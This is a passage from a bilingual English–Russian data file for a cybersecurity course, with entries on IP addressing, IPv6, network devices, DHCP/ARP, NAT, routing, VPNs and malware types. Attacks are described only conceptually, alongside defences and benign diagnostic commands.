      { heading: "Частные и особые диапазоны", body: "Частные диапазоны RFC 1918 (не маршрутизируются в публичном Интернете):\n• 10.0.0.0/8 (10.0.0.0 - 10.255.255.255)\n• 172.16.0.0/12 (172.16.0.0 - 172.31.255.255)\n• 192.168.0.0/16 (192.168.0.0 - 192.168.255.255)\n\nОсобые:\n• 127.0.0.0/8 — петлевой интерфейс (localhost)\n• 169.254.0.0/16 — APIPA / link-local\n• 100.64.0.0/10 — Carrier-Grade NAT (RFC 6598)\n• 224.0.0.0/4 — многоадресная; 255.255.255.255 — ограниченная широковещательная" },
      { heading: "Маска подсети и CIDR", body: "Маска подсети — 32-битное значение из непрерывных единиц (сеть) и нулей (узлы). Запись CIDR указывает число сетевых бит после слэша: /24 = 255.255.255.0.\n\nАдрес сети = IP И маска (все биты узла = 0).\nШироковещательный адрес = все биты узла = 1 (последний адрес).\nДоступно узлов = 2^(32 - префикс) - 2\n\nПример: 192.168.1.0/24 -> сеть .0, широковещательный .255, доступные .1 - .254 (254 узла)." },
      { heading: "Основные размеры подсетей", body: "/24 = 255.255.255.0 — 256 адресов, 254 доступно\n/25 = 255.255.255.128 — 128, 126 доступно\n/26 = 255.255.255.192 — 64, 62 доступно\n/27 = 255.255.255.224 — 32, 30 доступно\n/28 = 255.255.255.240 — 16, 14 доступно\n/29 = 255.255.255.248 — 8, 6 доступно\n/30 = 255.255.255.252 — 4, 2 доступно (каналы точка-точка)\n/31 (RFC 3021) = 2 адреса на точка-точка; /32 = маршрут одного узла." },
      { heading: "Субсетирование и VLSM", body: "Субсетирование «занимает» биты у части узла для создания меньших сетей. Разделим 192.168.1.0/24 на четыре подсети /26:\n192.168.1.0/26 (.1-.62), 192.168.1.64/26 (.65-.126), 192.168.1.128/26 (.129-.190), 192.168.1.192/26 (.193-.254).\nVLSM (маски переменной длины) использует разные размеры префикса для каждой подсети, чтобы не тратить адреса впустую." },
      { heading: "Значение для безопасности", body: "• IP-спуфинг основан на том, что адреса источника IPv4 не аутентифицируются.\n• Субсетирование и сегментация ограничивают горизонтальное перемещение и уменьшают широковещательные домены.\n• Частная адресация + NAT скрывает внутреннюю топологию.\n• Инструменты: ping, traceroute, ipcalc, калькуляторы подсетей для планирования сетей." }
    ]
  },
  {
    id: "ipv6_fundamentals",
    category: "Networking Fundamentals",
    title: "IPv6 Fundamentals",
    icon: "network",
    sections: [
      { heading: "Overview", body: "IPv6 (RFC 8200) uses 128-bit addresses, providing about 3.4 x 10^38 (340 undecillion) unique addresses — solving IPv4 exhaustion. Addresses are written as eight groups of four hexadecimal digits separated by colons, e.g. 2001:0db8:85a3:0000:0000:8a2e:0370:7334." },
      { heading: "Notation & Compression", body: "• Omit leading zeros in each group (0db8 -> db8).\n• Replace one run of consecutive all-zero groups with :: (only once).\n• Example: 2001:db8:85a3::8a2e:370:7334.\n• The /n prefix marks network bits, usually /64 for LANs." },
      { heading: "Address Types", body: "Unicast (one-to-one):\n• Global Unicast — 2000::/3, Internet-routable.\n• Link-Local — fe80::/10, auto-configured per interface, not routed.\n• Unique Local — fc00::/7, private equivalent of RFC 1918.\nMulticast (ff00::/8) — one-to-many.\nAnycast — nearest member of a group.\nThere is NO broadcast in IPv6; multicast and the all-nodes group ff02::1 replace it." },
      { heading: "Simplified Header & Features", body: "• Fixed 40-byte header with extension headers for options.\n• No header checksum (handled by link/transport layers).\n• No NAT required — the address space is large enough for global addressing.\n• Neighbor Discovery Protocol (NDP) over ICMPv6 replaces ARP.\n• SLAAC (Stateless Address Autoconfiguration) and DHCPv6 assign addresses.\n• IPsec support is mandatory to implement." },
      { heading: "Transition Mechanisms", body: "• Dual Stack — run IPv4 and IPv6 simultaneously (most common).\n• Tunneling — carry IPv6 over IPv4 (6to4, Teredo, ISATAP).\n• Translation — NAT64 / DNS64 map IPv6 clients to IPv4 servers." },
      { heading: "Security", body: "• The huge address space makes blind scanning impractical, but systems are still discoverable via DNS, multicast, and logs.\n• IPv6 firewalls are essential — do not rely on NAT for protection.\n• Filter ICMPv6 carefully (blocking it breaks NDP).\n• Watch for rogue Router Advertisements (use RA Guard) and extension-header evasion." }
    ],
    sections_ru: [
      { heading: "Обзор", body: "IPv6 (RFC 8200) использует 128-битные адреса, обеспечивая около 3,4 x 10^38 (340 ундециллионов) уникальных адресов — это решает проблему исчерпания IPv4. Адреса записываются как восемь групп из четырёх шестнадцатеричных цифр через двоеточие, например 2001:0db8:85a3:0000:0000:8a2e:0370:7334." },
      { heading: "Запись и сжатие", body: "• Ведущие нули в группе опускаются (0db8 -> db8).\n• Одна последовательность нулевых групп заменяется на :: (только один раз).\n• Пример: 2001:db8:85a3::8a2e:370:7334.\n• Префикс /n обозначает биты сети, обычно /64 для локальных сетей." },
      { heading: "Типы адресов", body: "Одноадресные (one-to-one):\n• Global Unicast — 2000::/3, маршрутизируются в Интернете.\n• Link-Local — fe80::/10, автоматически назначаются интерфейсу, не маршрутизируются.\n• Unique Local — fc00::/7, частный аналог RFC 1918.\nМногоадресные (ff00::/8) — one-to-many.\nAnycast — ближайший участник группы.\nВ IPv6 НЕТ широковещания; его заменяют многоадресная рассылка и группа всех узлов ff02::1." },
      { heading: "Упрощённый заголовок и возможности", body: "• Фиксированный заголовок 40 байт с заголовками расширений для параметров.\n• Отсутствует контрольная сумма заголовка (её обрабатывают канальный/транспортный уровни).\n• NAT не требуется — адресного пространства достаточно для глобальной адресации.\n• Neighbor Discovery Protocol (NDP) поверх ICMPv6 заменяет ARP.\n• SLAAC (автоконфигурация без состояния) и DHCPv6 назначают адреса.\n• Поддержка IPsec обязательна к реализации." },
      { heading: "Механизмы перехода", body: "• Dual Stack — одновременная работа IPv4 и IPv6 (наиболее распространено).\n• Туннелирование — передача IPv6 через IPv4 (6to4, Teredo, ISATAP).\n• Трансляция — NAT64 / DNS64 переводят IPv6-клиентов к IPv4-серверам." },
      { heading: "Безопасность", body: "• Огромное адресное пространство делает слепое сканирование непрактичным, но системы по-прежнему обнаруживаются через DNS, многоадресную рассылку и журналы.\n• Брандмауэры IPv6 необходимы — нельзя полагаться на NAT для защиты.\n• Фильтровать ICMPv6 нужно осторожно (блокировка ломает NDP).\n• Следите за мошенническими Router Advertisement (RA Guard) и обходом через заголовки расширений." }
    ]
  },
  {
    id: "network_devices",
    category: "Networking Fundamentals",
    title: "Network Devices",
    icon: "network",
    sections: [
      { heading: "Overview", body: "Network devices operate at different OSI layers and perform distinct roles. Understanding them is essential for both network design and security." },
      { heading: "Hub (Layer 1)", body: "A hub is a multiport repeater. It floods every incoming signal to all ports, creating a single collision domain and shared bandwidth. Obsolete; replaced by switches.\nSecurity: anyone can sniff all traffic; no isolation." },
      { heading: "Switch (Layer 2)", body: "A switch forwards frames based on a MAC address table (CAM table) and provides full-duplex, per-port collision domains. Features: VLANs, trunking (802.1Q), port security, STP. Layer 3 switches add routing.\nSecurity: MAC flooding (CAM overflow), VLAN hopping, DHCP snooping bypass." },
      { heading: "Router (Layer 3)", body: "Connects different networks/subnets and chooses the best path using a routing table. Provides the default gateway, NAT, and often a firewall.\nSecurity: route poisoning, BGP hijacking, ACL misconfiguration." },
      { heading: "Firewall", body: "Filters traffic between zones:\n• Stateless (packet filter) — matches on headers only.\n• Stateful — tracks connection state.\n• NGFW — adds application awareness, IPS, TLS inspection.\n• WAF — protects web apps (Layer 7).\nDeployments: network perimeter, DMZ, host-based (HIDS)." },
      { heading: "Wireless Access Point", body: "Bridges wireless clients to the wired LAN. Security: use WPA3 or WPA2-Enterprise, disable WPS, monitor for rogue APs and Evil Twins." },
      { heading: "Other Devices", body: "• Modem — converts signals between the ISP medium and the local network.\n• Bridge — joins two LAN segments at Layer 2.\n• Repeater — regenerates signals to extend distance.\n• Proxy — intermediary for requests (forward/reverse).\n• Load Balancer — distributes traffic across servers.\n• IDS/IPS — detect (and block) malicious traffic." }
    ],
    sections_ru: [
      { heading: "Обзор", body: "Сетевые устройства работают на разных уровнях OSI и выполняют разные роли. Их понимание необходимо как для проектирования сетей, так и для безопасности." },
      { heading: "Концентратор (уровень 1)", body: "Концентратор (hub) — многопортовый повторитель. Он рассылает входящий сигнал на все порты, создавая единый домен коллизий и общую пропускную способность. Устарел; заменён коммутаторами.\nБезопасность: любой может прослушивать весь трафик; изоляции нет." },
      { heading: "Коммутатор (уровень 2)", body: "Коммутатор (switch) пересылает кадры на основе таблицы MAC-адресов (CAM-таблицы) и обеспечивает полнодуплексные домены коллизий на порт. Возможности: VLAN, транкинг (802.1Q), port security, STP. Коммутаторы уровня 3 добавляют маршрутизацию.\nБезопасность: MAC-флудинг (переполнение CAM), перепрыгивание VLAN, обход DHCP snooping." },
      { heading: "Маршрутизатор (уровень 3)", body: "Соединяет разные сети/подсети и выбирает лучший путь по таблице маршрутизации. Обеспечивает шлюз по умолчанию, NAT и часто брандмауэр.\nБезопасность: отравление маршрутов, перехват BGP, неверная настройка ACL." },
      { heading: "Брандмауэр", body: "Фильтрует трафик между зонами:\n• Stateless (пакетный фильтр) — сопоставление только по заголовкам.\n• Stateful — отслеживание состояния соединений.\n• NGFW — включает контроль приложений, IPS, инспекцию TLS.\n• WAF — защита веб-приложений (уровень 7).\nРазмещение: периметр сети, DMZ, хостовый (HIDS)." },
      { heading: "Беспроводная точка доступа", body: "Связывает беспроводных клиентов с проводной локальной сетью. Безопасность: использовать WPA3 или WPA2-Enterprise, отключить WPS, следить за мошенническими AP и «злыми двойниками»." },
      { heading: "Другие устройства", body: "• Модем — преобразует сигналы между средой провайдера и локальной сетью.\n• Мост — объединяет два сегмента ЛВС на уровне 2.\n• Повторитель — восстанавливает сигнал для увеличения расстояния.\n• Прокси — посредник для запросов (прямой/обратный).\n• Балансировщик нагрузки — распределяет трафик между серверами.\n• IDS/IPS — обнаружение (и блокировка) вредоносного трафика." }
    ]
  },
  {
    id: "dhcp_arp",
    category: "Networking Fundamentals",
    title: "DHCP & ARP",
    icon: "network",
    sections: [
      { heading: "ARP — Address Resolution Protocol", body: "ARP (RFC 826) maps a known IPv4 address to a MAC address on the local segment.\n1. Host broadcasts an ARP Request: \"Who has 192.168.1.1?\"\n2. The owner replies with a unicast ARP Reply containing its MAC.\n3. The result is cached in the ARP table (arp -a / ip neigh).\nARP is broadcast and unauthenticated. Gratuitous ARP announces or updates a mapping without a request." },
      { heading: "ARP Attacks & Defense", body: "ARP Spoofing/Poisoning: an attacker sends forged ARP replies to associate their MAC with the gateway's IP, enabling Man-in-the-Middle or DoS.\nDefense:\n• Dynamic ARP Inspection (DAI) on managed switches\n• Static ARP entries for critical hosts\n• arpwatch / XArp monitoring\n• DHCP snooping (binds IP-MAC via DHCP)\nIPv6 replaces ARP with Neighbor Discovery (NDP) + ICMPv6." },
      { heading: "DHCP — Dynamic Host Configuration Protocol", body: "DHCP (RFC 2131) automatically assigns IP configuration (address, mask, gateway, DNS) using UDP ports 67 (server) and 68 (client).\n\nDORA process:\n1. Discover — client broadcasts for a server\n2. Offer — server proposes an address\n3. Request — client requests the offered address\n4. Acknowledge — server confirms and sets the lease\n\nLeases expire and are renewed (typically at 50% and 87.5% of the lease time)." },
      { heading: "DHCP Security", body: "• Rogue DHCP server: hands out a malicious gateway/DNS -> MITM.\n• DHCP starvation: exhausts the address pool to DoS clients.\nDefense: DHCP snooping, port security, 802.1X.\n\nUseful commands:\n• ipconfig /all (Windows)\n• ip a / ip addr (Linux)\n• ipconfig /release, ipconfig /renew\n• arp -a, ip neigh" }
    ],
    sections_ru: [
      { heading: "ARP — протокол разрешения адресов", body: "ARP (RFC 826) сопоставляет известный IPv4-адрес с MAC-адресом в локальном сегменте.\n1. Узел широковещательно отправляет ARP-запрос: «Кто владеет 192.168.1.1?»\n2. Владелец отвечает одноадресным ARP-ответом со своим MAC.\n3. Результат кэшируется в ARP-таблице (arp -a / ip neigh).\nARP широковещателен и не аутентифицирован. Gratuitous ARP объявляет или обновляет сопоставление без запроса." },
      { heading: "Атаки на ARP и защита", body: "ARP-спуфинг/отравление: злоумышленник отправляет поддельные ARP-ответы, связывая свой MAC с IP шлюза, что позволяет атаку «человек посередине» или DoS.\nЗащита:\n• Dynamic ARP Inspection (DAI) на управляемых коммутаторах\n• Статические ARP-записи для критичных узлов\n• Мониторинг arpwatch / XArp\n• DHCP snooping (привязка IP-MAC через DHCP)\nВ IPv6 ARP заменяется Neighbor Discovery (NDP) + ICMPv6." },
      { heading: "DHCP — протокол динамической конфигурации узла", body: "DHCP (RFC 2131) автоматически назначает IP-конфигурацию (адрес, маску, шлюз, DNS), используя UDP-порты 67 (сервер) и 68 (клиент).\n\nПроцесс DORA:\n1. Discover — клиент широковещательно ищет сервер\n2. Offer — сервер предлагает адрес\n3. Request — клиент запрашивает предложенный адрес\n4. Acknowledge — сервер подтверждает и устанавливает аренду\n\nАренда истекает и продлевается (обычно на 50% и 87,5% времени аренды)." },
      { heading: "Безопасность DHCP", body: "• Мошеннический DHCP-сервер: выдаёт вредоносный шлюз/DNS -> MITM.\n• DHCP-истощение: исчерпание пула адресов для DoS клиентов.\nЗащита: DHCP snooping, port security, 802.1X.\n\nПолезные команды:\n• ipconfig /all (Windows)\n• ip a / ip addr (Linux)\n• ipconfig /release, ipconfig /renew\n• arp -a, ip neigh" }
    ]
  },
  {
    id: "nat_pat",
    category: "Networking Fundamentals",
    title: "NAT & PAT",
    icon: "network",
    sections: [
      { heading: "Overview", body: "Network Address Translation (RFC 2663) rewrites IP addresses as packets cross between networks, allowing many private hosts to share public addresses and hiding internal topology. It is typically performed by the border router or firewall." },
      { heading: "Types of NAT", body: "• Static NAT (1:1) — fixed public-to-private mapping; used for servers.\n• Dynamic NAT — a pool of public addresses mapped on demand.\n• PAT / NAT Overload (many:1) — many inside hosts share one public IP, distinguished by source port. This is what home routers use.\n• Carrier-Grade NAT (CGNAT, RFC 6598) — ISP-level NAT for 100.64.0.0/10." },
      { heading: "Port Forwarding & DMZ", body: "Port forwarding maps an external port to an internal host (e.g., TCP 443 -> 10.0.0.5:443) so services are reachable from the Internet. A DMZ exposes a host to the Internet in an isolated subnet to limit exposure." },
      { heading: "Limitations & Traversal", body: "NAT breaks true end-to-end connectivity: inbound connections are blocked without a mapping, and protocols embedding IPs in payloads (SIP, FTP active mode, IPsec) can break. Solutions: STUN, TURN, ICE, UPnP, and protocol-aware ALGs." },
      { heading: "Security", body: "NAT is NOT a firewall. It blocks unsolicited inbound by coincidence of the mapping table but offers no inspection of outbound malware or of port-forwarded services. Always pair it with a stateful firewall and logging." }
    ],
    sections_ru: [
      { heading: "Обзор", body: "Network Address Translation (RFC 2663) переписывает IP-адреса при пересечении пакетами границ сетей, позволяя множеству частных узлов совместно использовать публичные адреса и скрывая внутреннюю топологию. Обычно выполняется пограничным маршрутизатором или брандмауэром." },
      { heading: "Типы NAT", body: "• Статический NAT (1:1) — фиксированное сопоставление публичного и частного адресов; для серверов.\n• Динамический NAT — пул публичных адресов, назначаемых по требованию.\n• PAT / NAT Overload (many:1) — множество внутренних узлов используют один публичный IP, различаясь по порту источника. Так работают домашние роутеры.\n• Carrier-Grade NAT (CGNAT, RFC 6598) — NAT на уровне провайдера для 100.64.0.0/10." },
      { heading: "Проброс портов и DMZ", body: "Проброс портов сопоставляет внешний порт с внутренним узлом (например, TCP 443 -> 10.0.0.5:443), делая сервисы доступными из Интернета. DMZ выставляет узел в Интернет в изолированной подсети для ограничения рисков." },
      { heading: "Ограничения и обход", body: "NAT нарушает сквозную связь: входящие соединения блокируются без сопоставления, а протоколы, встраивающие IP в полезную нагрузку (SIP, FTP в активном режиме, IPsec), могут ломаться. Решения: STUN, TURN, ICE, UPnP и ALG, учитывающие протокол." },
      { heading: "Безопасность", body: "NAT — НЕ брандмауэр. Он блокирует незапрошенный входящий трафик лишь по принципу таблицы сопоставления, но не инспектирует исходящее вредоносное ПО и сервисы с проброшенными портами. Всегда сочетайте NAT со stateful-брандмауэром и журналированием." }
    ]
  },
  {
    id: "routing_switching",
    category: "Networking Fundamentals",
    title: "Routing & Switching",
    icon: "network",
    sections: [
      { heading: "Routing Basics", body: "Routing is the Layer 3 process of selecting a path between networks. Routers use a routing table and forward packet-by-packet (hop-by-hop).\n• Longest Prefix Match — the most specific route wins.\n• Default route (0.0.0.0/0) — used when no specific route matches.\n• Each hop decrements the TTL; TTL 0 -> ICMP Time Exceeded." },
      { heading: "Routing Protocols", body: "Static — manually configured; simple, no overhead, no automatic failover.\nDynamic — learns routes automatically:\n• Distance Vector: RIP (EIGRP is a hybrid).\n• Link State: OSPF, IS-IS.\n• Path Vector / Exterior: BGP (the Internet's inter-domain protocol).\nMetrics: hop count, bandwidth, delay, cost. Administrative Distance breaks ties between protocols." },
      { heading: "Switching Basics", body: "Switches learn source MACs into a CAM table, forward known unicast to the correct port, and flood unknown/broadcast frames. VLANs (802.1Q) segment a switch into isolated broadcast domains; trunks carry multiple VLANs between switches. Inter-VLAN routing needs a Layer 3 device (router-on-a-stick or L3 switch)." },
      { heading: "Spanning Tree Protocol", body: "STP (802.1D; RSTP 802.1w; MSTP 802.1s) prevents Layer 2 loops by blocking redundant links and electing a root bridge with root ports. Without STP, loops cause broadcast storms that can take down the network." },
      { heading: "Security", body: "• Route poisoning / forged routing updates.\n• BGP hijacking / route leaks.\n• VLAN hopping (DTP abuse, double tagging).\n• STP manipulation (rogue root bridge) -> use BPDU Guard / Root Guard.\n• MAC flooding -> port security, sticky MACs." }
    ],
    sections_ru: [
      { heading: "Основы маршрутизации", body: "Маршрутизация — процесс выбора пути между сетями на уровне 3. Маршрутизаторы используют таблицу маршрутизации и пересылают пакеты пошагово (hop-by-hop).\n• Наиболее длинное совпадение префикса — выигрывает самый конкретный маршрут.\n• Маршрут по умолчанию (0.0.0.0/0) — применяется, если нет совпадений.\n• Каждый узел уменьшает TTL; при TTL 0 отправляется ICMP Time Exceeded." },
      { heading: "Протоколы маршрутизации", body: "Статические — настраиваются вручную; простые, без накладных расходов, без автоматического переключения.\nДинамические — изучают маршруты автоматически:\n• Distance Vector: RIP (EIGRP — гибрид).\n• Link State: OSPF, IS-IS.\n• Path Vector / внешние: BGP (междоменный протокол Интернета).\nМетрики: число переходов, пропускная способность, задержка, стоимость. Административная дистанция разрешает конфликты между протоколами." },
      { heading: "Основы коммутации", body: "Коммутаторы изучают MAC-адреса источников в CAM-таблице, пересылают известные одноадресные кадры на нужный порт и рассылают неизвестные/широковещательные кадры. VLAN (802.1Q) делят коммутатор на изолированные широковещательные домены; транки переносят несколько VLAN между коммутаторами. Для маршрутизации между VLAN нужен устройство уровня 3 (router-on-a-stick или L3-коммутатор)." },
      { heading: "Протокол связующего дерева (STP)", body: "STP (802.1D; RSTP 802.1w; MSTP 802.1s) предотвращает петли уровня 2, блокируя резервные каналы и выбирая корневой мост с корневыми портами. Без STP петли вызывают широковещательные штормы, способные обрушить сеть." },
      { heading: "Безопасность", body: "• Отравление маршрутов / поддельные обновления маршрутизации.\n• Перехват BGP / утечки маршрутов.\n• Перепрыгивание VLAN (злоупотребление DTP, двойная тегировка).\n• Манипуляция STP (мошеннический корневой мост) -> BPDU Guard / Root Guard.\n• MAC-флудинг -> port security, sticky MAC." }
    ]
  },
  {
    id: "network_types_topologies",
    category: "Networking Fundamentals",
    title: "Network Types & Topologies",
    icon: "network",
    sections: [
      { heading: "Network Types by Scale", body: "• PAN — Personal Area Network (Bluetooth, ~10 m).\n• LAN — Local Area Network (home/office).\n• CAN — Campus Area Network.\n• MAN — Metropolitan Area Network (city).\n• WAN — Wide Area Network (spans countries; the Internet is the largest).\n• SAN — Storage Area Network (block storage).\n• VPN — a logical private network over a public one.\nAlso: Intranet (private internal), Extranet (controlled partner access)." },
      { heading: "Topologies", body: "• Bus — all nodes on one backbone; cheap, single point of failure.\n• Star — all nodes attach to a central device; common, easy to manage.\n• Ring — nodes in a loop; predictable, one break can disrupt.\n• Mesh — nodes interconnected; highly resilient, expensive (full mesh).\n• Tree — hierarchical star/bus combination.\n• Hybrid — a mix of the above." },
      { heading: "Architectures & Transmission", body: "Architectures: Client-Server (centralized control, scalable) vs Peer-to-Peer (no central server, simple).\nTransmission modes:\n• Unicast — one-to-one\n• Multicast — one-to-many (subscribed group)\n• Broadcast — one-to-all on a segment\n• Anycast — one-to-nearest of a group" },
      { heading: "Media", body: "Wired: twisted pair (Cat5e/Cat6), coaxial, fiber optic (single/multi-mode).\nWireless: Wi-Fi, cellular, microwave, satellite.\nChoice depends on distance, bandwidth, cost, and interference/security needs." },
      { heading: "Security", body: "Larger networks widen the attack surface. Use segmentation (VLANs, subnets, DMZs), least privilege, monitoring at chokepoints, and encryption on shared/WAN media." }
    ],
    sections_ru: [
      { heading: "Типы сетей по масштабу", body: "• PAN — персональная сеть (Bluetooth, ~10 м).\n• LAN — локальная сеть (дом/офис).\n• CAN — кампусная сеть.\n• MAN — городская сеть.\n• WAN — глобальная сеть (охватывает страны; Интернет — крупнейшая).\n• SAN — сеть хранения данных (блочное хранилище).\n• VPN — логическая частная сеть поверх публичной.\nТакже: Intranet (внутренняя частная), Extranet (контролируемый доступ партнёров)." },
      { heading: "Топологии", body: "• Шина — все узлы на одной магистрали; дёшево, единая точка отказа.\n• Звезда — все узлы подключены к центральному устройству; распространена, проста в управлении.\n• Кольцо — узлы в петле; предсказуемо, разрыв нарушает работу.\n• Ячеистая (mesh) — узлы связаны друг с другом; высокая отказоустойчивость, дорого (полная ячеистая).\n• Дерево — иерархическая комбинация звезды/шины.\n• Гибридная — сочетание перечисленных." },
      { heading: "Архитектуры и передача", body: "Архитектуры: клиент-сервер (централизованное управление, масштабируемость) и одноранговая (P2P, без центрального сервера, простота).\nРежимы передачи:\n• Unicast — один-к-одному\n• Multicast — один-ко-многим (по подписке)\n• Broadcast — один-ко-всем в сегменте\n• Anycast — один-к-ближайшему из группы" },
      { heading: "Среды передачи", body: "Проводные: витая пара (Cat5e/Cat6), коаксиальный кабель, оптоволокно (одно/многомодовое).\nБеспроводные: Wi-Fi, сотовая связь, микроволны, спутник.\nВыбор зависит от расстояния, пропускной способности, стоимости и требований к помехам/безопасности." },
      { heading: "Безопасность", body: "Крупные сети расширяют поверхность атаки. Используйте сегментацию (VLAN, подсети, DMZ), минимальные привилегии, мониторинг в узловых точках и шифрование на общих/WAN-средах." }
    ]
  },
  {
    id: "vpn_tunneling",
    category: "Networking Fundamentals",
    title: "VPN & Tunneling",
    icon: "network",
    sections: [
      { heading: "Overview", body: "A Virtual Private Network creates an encrypted tunnel over an untrusted network (usually the Internet), giving remote users or sites a private, authenticated path. It provides confidentiality, integrity, and authentication of traffic." },
      { heading: "VPN Types", body: "• Remote-Access VPN — individual users connect (client-to-site).\n• Site-to-Site VPN — connects whole networks (e.g., branch to HQ).\n• Full Tunnel — all traffic routes through the VPN.\n• Split Tunnel — only corporate traffic uses the VPN (offers less protection)." },
      { heading: "VPN Protocols", body: "• IPsec — suite with AH (integrity) and ESP (encryption); uses IKE for key exchange; transport mode (payload only) or tunnel mode (whole packet). Common in site-to-site.\n• SSL/TLS VPN — OpenVPN, OpenConnect, clientless web portals. Traverses firewalls easily via TCP 443.\n• WireGuard — modern, small, fast; uses the Noise protocol framework.\n• IKEv2/IPsec — mobile-friendly with reconnection.\n• L2TP/IPsec — no encryption of its own, relies on IPsec.\n• PPTP — obsolete and broken; do not use." },
      { heading: "Tunneling Protocols", body: "GRE (Generic Routing Encapsulation) and IP-in-IP wrap one protocol inside another to build virtual links; GRE has no encryption, so it is usually combined with IPsec." },
      { heading: "Security Considerations", body: "• A VPN encrypts transport, it does NOT prevent malware, phishing, or compromised credentials.\n• Split tunneling can leak traffic outside the tunnel.\n• Centralize logging, enforce MFA, and rotate keys.\n• Modern direction: Zero Trust Network Access (ZTNA) instead of broad network tunnels." }
    ],
    sections_ru: [
      { heading: "Обзор", body: "Виртуальная частная сеть (VPN) создаёт шифрованный туннель поверх недоверенной сети (обычно Интернета), давая удалённым пользователям или площадкам частный аутентифицированный путь. Обеспечивает конфиденциальность, целостность и аутентификацию трафика." },
      { heading: "Типы VPN", body: "• VPN удалённого доступа — подключаются отдельные пользователи (клиент-сайт).\n• VPN «сайт-сайт» — соединяет целые сети (например, филиал с головным офисом).\n• Полный туннель — весь трафик идёт через VPN.\n• Разделённый туннель (split tunnel) — через VPN идёт только корпоративный трафик (меньше защиты)." },
      { heading: "Протоколы VPN", body: "• IPsec — набор с AH (целостность) и ESP (шифрование); использует IKE для обмена ключами; транспортный режим (только полезная нагрузка) или туннельный (весь пакет). Обычен для «сайт-сайт».\n• SSL/TLS VPN — OpenVPN, OpenConnect, веб-порталы без клиента. Легко проходит брандмауэры через TCP 443.\n• WireGuard — современный, компактный, быстрый; использует Noise protocol framework.\n• IKEv2/IPsec — удобен для мобильных с переподключением.\n• L2TP/IPsec — своего шифрования нет, полагается на IPsec.\n• PPTP — устарел и взломан; не использовать." },
      { heading: "Протоколы туннелирования", body: "GRE (Generic Routing Encapsulation) и IP-in-IP инкапсулируют один протокол в другой для создания виртуальных каналов; GRE не шифрует, поэтому обычно применяется вместе с IPsec." },
      { heading: "Вопросы безопасности", body: "• VPN шифрует транспорт, но НЕ предотвращает вредоносное ПО, фишинг или компрометацию учётных данных.\n• Разделённый туннель может пропускать трафик мимо туннеля.\n• Централизуйте журналирование, внедряйте MFA и ротацию ключей.\n• Современное направление: Zero Trust Network Access (ZTNA) вместо широких сетевых туннелей." }
    ]
  },

  // ─── THREATS & ATTACKS ─────────────────────────────────────────────
  {
    id: "malware_types",
    category: "Threats & Attacks",
    title: "Malware — Types & Analysis",
    icon: "skull",
    sections: [
      { heading: "What is Malware?", body: `Malware (malicious software) is any software intentionally designed to disrupt, damage, or gain unauthorized access to computer systems. It is the primary tool of cybercriminals, hacktivists, and state-sponsored actors.` },
      { heading: "Virus", body: `A virus attaches to a legitimate host file and requires user action to execute, then replicates.\n\nTypes: File infectors, Boot sector viruses, Macro viruses (Office docs), Polymorphic (changes code to evade AV), Metamorphic (completely rewrites itself).\n\nExample: CIH/Chernobyl (1998) — overwrote hard drive MBR and BIOS.` },
      { heading: "Worm", body: `Self-replicating malware that spreads across networks without user interaction.\n\nNotable worms:\n• Morris Worm (1988): First major internet worm\n• Code Red (2001): IIS buffer overflow\n• Stuxnet (2010): Nation-state worm targeting Iranian nuclear PLCs\n• WannaCry (2017): EternalBlue exploit, 230,000+ machines in 150 countries` },
      { heading: "Trojan Horse", body: `Malware disguised as legitimate software. Does not self-replicate.\n\nTypes:\n• RAT (Remote Access Trojan): Full control (DarkComet, njRAT)\n• Banking Trojan: Steals financial credentials (Zeus, Emotet, TrickBot)\n• Dropper/Loader: Downloads other malware\n• Backdoor: Creates persistent unauthorized access` },
      { heading: "Rootkit", body: `Provides privileged access while hiding presence.\n\nTypes:\n• User-mode: Intercepts API calls\n• Kernel-mode: Modifies kernel — extremely hard to detect\n• Bootkit: Infects MBR/bootloader\n• Hypervisor: Runs below the OS\n\nDetection: rkhunter, chkrootkit, Volatility (memory forensics).` },
      { heading: "Malware Analysis", body: `Static Analysis (without executing):\n• strings malware.exe — extract readable text\n• PE Studio — examine imports, sections\n• Ghidra / IDA Pro — disassemble binary\n• VirusTotal — check hash against 70+ AV engines\n\nDynamic Analysis (executing in sandbox):\n• Cuckoo Sandbox, Any.Run, Joe Sandbox\n• Process Monitor — file/registry/network activity\n• Wireshark — capture C2 communication\n\nYARA Rules: pattern-matching for malware classification.` }
    ],
    sections_ru: [
      { heading: "Что такое вредоносное ПО?", body: `Вредоносное ПО (malware) — программное обеспечение, намеренно созданное для нарушения работы, повреждения или несанкционированного доступа к компьютерным системам. Это основной инструмент киберпреступников, хактивистов и государственных злоумышленников.` },
      { heading: "Вирус", body: `Вирус прикрепляется к легитимному файлу-носителю и требует действия пользователя для запуска, после чего размножается.\n\nТипы: файловые инфекторы, вирусы загрузочного сектора, макровирусы (в документах Office), полиморфные (меняют код для обхода антивируса), метаморфные (полностью переписывают себя).\n\nПример: CIH/Чернобыль (1998) — перезаписывал MBR жёсткого диска и BIOS.` },
      { heading: "Червь", body: `Самовоспроизводящееся вредоносное ПО, распространяющееся по сети без участия пользователя.\n\nИзвестные черви:\n• Morris Worm (1988): Первый крупный интернет-червь\n• Code Red (2001): Переполнение буфера IIS\n• Stuxnet (2010): Государственный червь против ядерных объектов Ирана\n• WannaCry (2017): Эксплойт EternalBlue, 230 000+ машин в 150 странах` },
      { heading: "Троянский конь", body: `Вредоносное ПО, замаскированное под легитимное. Не самовоспроизводится.\n\nТипы:\n• RAT (троян удалённого доступа): полный контроль над системой (DarkComet, njRAT)\n• Банковский троян: кража финансовых данных (Zeus, Emotet, TrickBot)\n• Дроппер/Загрузчик: скачивает другое вредоносное ПО\n• Бэкдор: создаёт постоянный несанкционированный удалённый доступ` },
      { heading: "Руткит", body: `Обеспечивает привилегированный доступ, скрывая своё присутствие.\n\nТипы:\n• Пользовательского режима: перехватывает API-вызовы\n• Режима ядра: модифицирует ядро ОС — крайне сложно обнаружить\n• Буткит: заражает MBR/загрузчик\n• Гипервизорный: работает ниже уровня ОС\n\nОбнаружение: rkhunter, chkrootkit, Volatility (анализ памяти).` },
      { heading: "Анализ вредоносного ПО", body: `Статический анализ (без запуска):\n• strings malware.exe — извлечение читаемых строк\n• PE Studio — анализ импортов и секций\n• Ghidra / IDA Pro — дизассемблирование бинарника\n• VirusTotal — проверка хеша в 70+ антивирусах\n\nДинамический анализ (в изолированной среде):\n• Cuckoo Sandbox, Any.Run, Joe Sandbox\n• Process Monitor — активность файлов/реестра/сети\n• Wireshark — перехват C2-трафика\n\nПравила YARA: сопоставление паттернов для классификации вредоносного ПО.` }
    ]
  },

  {
    id: "ransomware",
    category: "Threats & Attacks",
    title: "Ransomware",
    icon: "skull",
    sections: [
